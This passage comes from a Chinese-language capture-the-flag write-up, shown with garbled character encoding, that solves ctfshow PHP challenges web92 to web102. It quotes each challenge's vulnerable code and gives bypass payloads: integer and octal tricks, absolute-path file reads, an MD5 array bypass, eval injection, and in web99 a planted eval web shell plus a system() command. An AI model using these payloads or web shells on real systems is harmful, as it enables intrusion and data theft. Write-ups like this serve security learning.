¼ï¼Œç¬¬ä¸‰ä¸ªifåˆ™æ˜¯å¦‚æœnumå–æ•´åç­‰äº4476åˆ™è¾“å‡ºflag,è¿™é‡Œå¯ä»¥?num&#x3D;4476.(1-9éƒ½å¯ä»¥)</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸92é¢˜è§£é¢˜æ–¹æ³•ä¸€æ ·ï¼Œä¸åŒç‚¹åœ¨äº93é¢˜åŠ å…¥äº†ä¸€ä¸ªifå‡½æ•°æ¥ç­›é€‰ï¼Œå…¶å®ä¹Ÿä¸å½±å“åŸæœ¬åšé¢˜æ€è·¯ï¼ŒåŠ å…¥äº†preg_matchå‡½æ•°ï¼Œä½œç”¨æ˜¯å¦‚æœå‡ºç°äº†a-z|A-Zçš„å­—ç¬¦ï¼Œå°±ä¼šè¾“å‡ºnonono<br>ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå‡½æ•°intvalï¼Œè‹¥numå–æ•´åç­‰äº4476ï¼Œåˆ™è¾“å‡ºflagï¼Œè¾“å…¥?num&#x3D;4476.2è·å–flag</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ¬é¢˜ä¸å‰å‡ é¢˜å¹¶æ— å¤ªå¤§åŒºåˆ«ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æœ¬é¢˜æ·»åŠ äº†ä¸€ä¸ªifè¯­å¥ï¼Œstrops(stringï¼Œfindï¼Œstart)ç”¨äºæ£€æµ‹å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²å‡ºç°çš„ä½ç½®ï¼Œæ»¡è¶³strpos($num, â€œ0â€)è¯­å¥çš„æ¡ä»¶æ˜¯numé‡Œçš„æ•°æœ‰0è¿”å›trueï¼Œæ²¡0è¿”å›flaseï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹è¿™ä¸ªå‡½æ•°å‰é¢æœ‰ä¸€ä¸ªï¼å·ï¼Œå¦‚æœæˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªifè¯­å¥ï¼Œå°±éœ€è¦ä½¿æˆ‘ä»¬çš„numé‡Œå«æœ‰0ï¼Œè¿™æ ·å°±ä¼šç»•è¿‡è¿™ä¸ªifï¼ŒåŒæ—¶ä¸‹ä¸€ä¸ªå–æ•´å‡½æ•°ä¹Ÿä¸ä¼šè€½æ?num&#x3D;4476.01 or ?num&#x3D;4476.0çš†å¯</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡çš„preg_matchå‡½æ•°ä¸ä»…æŠŠå­—æ¯è¿‡æ»¤äº†è¿˜æŠŠ.ç»™è¿‡æ»¤äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸èƒ½è¿›è¡Œä¸Šä¸€é¢˜çš„æ“ä½œäº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿›åˆ¶è½¬æ¢çš„ä¾¿åˆ©ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨010574(4476çš„å…«è¿›åˆ¶)ç»•è¿‡ï¼Œå»çœ‹äº†çœ‹intvalå‡½æ•°çš„å‘ç°æœ€å¼€å¤´å¯ä»¥å¦‚æœæ˜¯+è¿˜æ˜¯å¯ä»¥è¯†åˆ«ä¸ºåŸæ•°ï¼Œsoï¼Œpayload&#x3D;?num&#x3D;+010574</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br><br><br>&#125; <br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªifè¡¨æ˜äº†ä¸èƒ½ç›´æ¥ä»¥ç›¸å¯¹è·¯å¾„è¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ç»å¯¹è·¯å¾„è¯»<br>payload:?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>æˆ–è€…ä¹Ÿå¯ä»¥è¿”å›ä¸Šä¸€çº§ç„¶åå†å›æ¥è¯»å–<br>payload:?u&#x3D;..&#x2F;html&#x2F;flag.php<br>æˆ–è€…<br>payload:?u&#x3D;.&#x2F;flag.php</p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™ä¸€å…³ä½¿ç”¨MD5ç¢°æ’<br>è€Œä¸”ä½¿postæ–¹å¼æ‰€ä»¥è¦åœ¨hackbaré‡Œçš„post dataé‡Œè¾“å…¥<br>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨æ•°ç»„çš„æ–¹å¼ç»•è¿‡ï¼Œpayloadï¼ša[]&#x3D;1 &amp; b[]&#x3D;2<br>å¯ä»¥çœ‹åˆ°é¡µé¢ä¸Šå‡ºç°äº†warningï¼Œä½†ä¹Ÿæ˜¾ç¤ºäº†flagï¼Œè¿™æ˜¯å› ä¸ºPHPå¯¹æ— æ³•md5åŠ å¯†çš„ä¸œè¥¿ä¸åŠ å¯†ï¼Œç»“æœä¸ºNULLï¼Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯null&#x3D;nullï¼Œé€»è¾‘å…³ç³»ä¸ºTrueã€‚æ‰€ä»¥å¯ä»¥è¾“å‡ºflagã€‚</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>è€ƒç‚¹ï¼šå˜é‡è¦†ç›–ã€ä¸‰å…ƒè¿ç®—ç¬¦ã€&amp;åœ¨phpä¸­çš„åº”ç”¨ä½œç”¨<br>ç¬¬ä¸€å¥çš„æ„æ€æ˜¯å¦‚æœå­˜åœ¨GETè¯·æ±‚åˆ™å¼•ç”¨POSTè¯·æ±‚çš„å†…å®¹<br>æ‰€ä»¥æˆ‘ä»¬urlæ ä¸­éšä¾¿å¡«ä¸€å¡«<br>ç„¶åå†åœ¨hackbarä¸Šçš„post dataè¾“å…¥å…³é”®å¥HTTP_FLAG&#x3D;flag<br>è¿™æ ·å°±æˆåŠŸå›æ˜¾äº†flag<br>æ‰€ä»¥ç¬¬ä¸€å¥å­˜åœ¨å˜é‡è¦†ç›–çš„æ•ˆæœï¼Œæ‰€ä»¥GETè¯·æ±‚ä¸ç®¡ç»™ä»€ä¹ˆä¸œè¥¿éƒ½ä¼šè¢«postè¯·æ±‚è¦†ç›–æ‰</p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allow</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$allow</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ±‚ï¼š1ã€å˜é‡nå­˜åœ¨äºéšæœºæ•°ç»„$allowä¸­<br>çŸ¥è¯†ç‚¹ï¼š<br>1.array_push()å‘æ•°ç»„å°¾éƒ¨æ·»åŠ å…ƒç´ <br>2.file_put_contents($filename,$data,$data,$flags,$context)å‘æ–‡ä»¶ä¸­å†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè‹¥æ²¡æœ‰æ–‡ä»¶ï¼Œåˆ™å…ˆåˆ›å»ºåœ¨å†™å…¥<br>3.in_array($value,$array,$type)<br>å¼±ç±»å‹æ¯”è¾ƒ<br>åˆ¤æ–­$valueæ˜¯å¦å­˜åœ¨$arrayçš„å€¼<br>$typeè‹¥ä¸ºtrueï¼Œåˆ™æ£€æµ‹$valueå€¼ä¸$arrayå€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒ<br><strong>æ–¹æ³•ä¸€ï¼š</strong><br>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>getï¼š n&#x3D;123.php æ•°å­—æ˜¯å¤šå°‘æ— æ‰€ä¸ºï¼Œå°äº0x36då°±è¡Œï¼Œæ•°ç»„$allowæ˜¯ç”±36ä¸ªå°äº0x36dçš„éšæœº æ•°å­—ç»„æˆï¼Œå› æ­¤éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œè™½ç„¶æˆ‘è¯•äº†å¾ˆå¤šæ¬¡ï¼Œä½†ä¾æ—§æ²¡æ˜¾ç¤ºå‡ºæ¥ğŸ˜­<br>postï¼š content&#x3D;<?=system(tac fla*);?></p><p><strong>æ–¹æ³•äºŒï¼š</strong><br>ä¸Šä¼ æœ¨é©¬<br>get: n&#x3D;2.php<br>post: content&#x3D;<?php eval($_POST["233"])?><br><img src="/images/322.png"><br>ç„¶åæˆ‘ä»¬å¼€å¯ä¸­å›½èšå‰‘<br><img src="/images/455.png"><br>è¿æ¥æˆåŠŸ<br><img src="/images/562.png"><br>è·å¾—flag!</p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flag in class ctfshow</strong><br>å…ˆçœ‹v0,è¿™é‡Œæœ‰ä¸ªå°ç‰¹æ€§ï¼Œèµ‹å€¼&#x3D;çš„ä¼˜å…ˆçº§é«˜äºé€»è¾‘è¿ç®—ï¼Œæ‰€ä»¥åªè¦è®©is_numeric($v1)è¿”å›trueå³å¯æ»¡è¶³ifåˆ¤æ–­ï¼Œandåé¢çš„æ— è®ºç»“æœå¦‚ä½•éƒ½ä¸å½±å“<br>å†çœ‹ç¬¬äºŒä¸ªifï¼Œæ³¨æ„å‡½æ•°å‰é¢çš„!(é),è¡¨ç¤ºäº†v2ä¸èƒ½å‡ºç°;<br>ç¬¬ä¸‰ä¸ªifè¡¨ç¤ºv3é‡Œå¿…é¡»è¦å‡ºç° <strong>;</strong></p><p>payloadï¼š?v1&#x3D;123&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;</p><p>tip: var_dump() å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚.</p><p>ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span> = <span class="hljs-number">3.1</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºä¸ºï¼š<br>float(3.1)<br>bool(true)</p><p>æœ¬é¢˜çš„var_dump()ç”¨æ¥å¾—åˆ°ctfshowé‡Œçš„å†…å®¹ã€‚<br><img src="/images/623.png"></p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>first ä¸Šä»£ç </p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs swift">highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> <span class="hljs-operator">=</span> new ctfshow();<br><span class="hljs-variable">$v1</span><span class="hljs-operator">=</span><span class="hljs-variable">$_GET</span>[&#x27;v1&#x27;];<br><span class="hljs-variable">$v2</span><span class="hljs-operator">=</span><span class="hljs-variable">$_GET</span>[&#x27;v2&#x27;];<br><span class="hljs-variable">$v3</span><span class="hljs-operator">=</span><span class="hljs-variable">$_GET</span>[&#x27;v3&#x27;];<br><span class="hljs-variable">$v0</span><span class="hljs-operator">=</span>is_numeric(<span class="hljs-variable">$v1</span>) and is_numeric(<span class="hljs-variable">$v2</span>) and is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|\/|\~|\`|\!|\@|\#|<span class="hljs-subst">\\</span>$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|<span class="hljs-subst">\&quot;</span>|<span class="hljs-subst">\&#x27;</span>|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|\/|\~|\`|\!|\@|\#|<span class="hljs-subst">\\</span>$|\%|\^|\*|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\<span class="hljs-operator">-|</span>\<span class="hljs-keyword">_</span><span class="hljs-operator">|</span>\<span class="hljs-operator">+|</span>\<span class="hljs-operator">=|</span>\&#123;<span class="hljs-operator">|</span>\[<span class="hljs-operator">|</span>\<span class="hljs-string">&quot;|<span class="hljs-subst">\&#x27;</span>|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>)</span>)&#123;</span><br><span class="hljs-string">            eval(&quot;</span><span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span><span class="hljs-string">&quot;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">&#125; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™æ¬¡ç‰¹æ®Šç¬¦å·åŸºæœ¬ä¸Šéƒ½è¢«ç¦ç”¨äº†ï¼Œåˆ©ç”¨ReflectionClass(å’±ä¹Ÿä¸çŸ¥é“æ˜¯å•¥ï¼Œçœ‹é¢˜è§£ä¹Ÿä¸ä¼šğŸ˜­)å»ºç«‹ctfshowç±»çš„åå°„ç±»ï¼Œnew ReflectionnClass($class)è·å¾—classçš„åå°„å¯¹è±¡(åŒ…æ‹¬äº†å…ƒæ•°æ®ä¿¡æ¯) v3æ˜¯ä¸èƒ½ä¸º;ä»¥å¤–çš„ç‰¹æ®Šå­—ç¬¦</p><p>payload:?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionlass&amp;v3&#x3D;;<br>è·å–çš„ flag éœ€è¦å°† 0x2d æ›¿æ¢æˆ -<br><img src="/images/2132.png"></p><h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span 